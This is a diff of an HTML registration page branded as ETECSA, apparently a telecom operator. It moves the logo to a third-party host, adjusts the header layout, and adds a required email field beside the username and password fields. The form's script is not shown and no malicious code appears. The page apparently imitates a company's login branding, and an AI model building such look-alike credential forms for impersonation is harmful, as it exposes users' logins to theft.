@@ -28,19 +28,23 @@
             left: 0;
         }
 
+        .header .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
         .header .logo {
             width: 50px;
             height: 50px;
-            background: url('https://www.etecsa.cu/sites/default/files/logo.png') no-repeat center center;
+            background: url('https://logosandtypes.com/wp-content/uploads/2025/01/ETECSA-Logo.svg') no-repeat center center;
             background-size: contain;
-            display: inline-block;
-            vertical-align: middle;
+            margin-right: 10px;
         }
 
         .header .title {
             display: inline-block;
             vertical-align: middle;
-            margin-left: 10px;
             font-size: 20px;
         }
 
@@ -125,8 +129,10 @@
 </head>
 <body>
     <div class="header">
-        <span class="logo"></span>
-        <span class="title">ETECSA</span>
+        <div class="logo-container">
+            <span class="logo"></span>
+            <span class="title">ETECSA</span>
+        </div>
     </div>
     <div class="container">
         <h1>ETECSA</h1>
@@ -136,6 +142,9 @@
         <form id="registerForm">
             <div class="input-group">
                 <input type="text" id="username" placeholder="Introduce tu usuario..." required>
+            </div>
+            <div class="input-group">
+                <input type="email" id="email" placeholder="Introduce tu correo electrónico" required>
             </div>
             <div class="input-group">
                 <input type="password" id="password" placeholder="Contraseña" required>
@@ -148,4 +157,4 @@
 
     <script src="script.js"></script>
 </body>
-        </html>
+    </html>
